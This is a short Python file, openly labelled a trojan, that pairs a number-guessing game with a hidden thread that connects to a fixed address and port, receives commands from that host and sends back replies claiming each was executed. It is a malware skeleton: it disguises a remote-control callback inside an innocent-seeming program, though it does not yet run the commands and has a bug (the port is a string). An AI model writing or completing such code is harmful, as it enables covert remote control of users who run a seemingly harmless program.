# trojan script that runs a separate rev shell script

import random, socket, threading, os

def trojan():
    # call home
    HOST = '192.168.0.1'
    PORT = '9090'
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "test":
            print("test command received")
        client.send(f"{server_command} was executed successfully.".encode('utf-8'))

# normal number guessing game
def game():
    randInt = random.randint(1,100)
    userinput = int(input("input number from 1- 100: "))
    tries = 1
    while (userinput != randInt):
        tries+=1
        if (userinput<randInt):
            print("guess higher!")
        else:
            print("guess lower!")
        userinput = int(input("try again: "))
    print(f"game complete! you took {tries} tries")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()